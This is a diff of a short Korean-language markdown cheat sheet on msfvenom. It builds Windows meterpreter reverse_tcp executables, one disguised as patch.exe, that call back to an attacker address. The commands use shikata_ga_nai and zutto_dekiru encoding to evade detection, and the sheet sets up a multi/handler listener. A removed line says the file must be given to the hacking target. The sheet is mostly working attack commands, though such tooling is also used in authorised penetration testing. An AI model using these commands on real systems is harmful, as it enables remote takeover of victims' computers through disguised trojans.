@@ -1,19 +1,24 @@
 ## msfvenom 사용법
 ```
-root로 로그인 후,
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe lhost=192.168.123.112 lport=4444 -o /root/test.exe
 
-그럼 /root/에 test.exe 파일이 생성됨. (test.exe 파일을 해킹 대상자에게 주어야함)
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe -o payload.exe
 
-또는 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe -o payload.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=(공격자ip) lport=(default=4444) -f exe -e x64/zutto_dekiru -i 3 -o /root/patch.exe
 
 ```
-> -p : 페이로드 옵션을 설정   -o : 파일 경로와 파일명 지정   -e : 인코딩 방식   -f : 파일 확장자 설정   --platform : 플랫폼 설정
+> -p : 페이로드 옵션을 설정    
+> -o : 파일 경로와 파일명 지정    
+> -e : 인코딩     
+> -f : 파일 형식
+> -a : 아키텍쳐         
+> --platform : 플랫폼 설정 
+> -i : 인코딩 횟수     
 
 ```
 msfconsle
 use multi/handler
-set payload windows/meterpreter/reverse_tcp
+set payload windows/meterpreter/reverse_tcp or windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.123.112
 set LPORT 4444
 
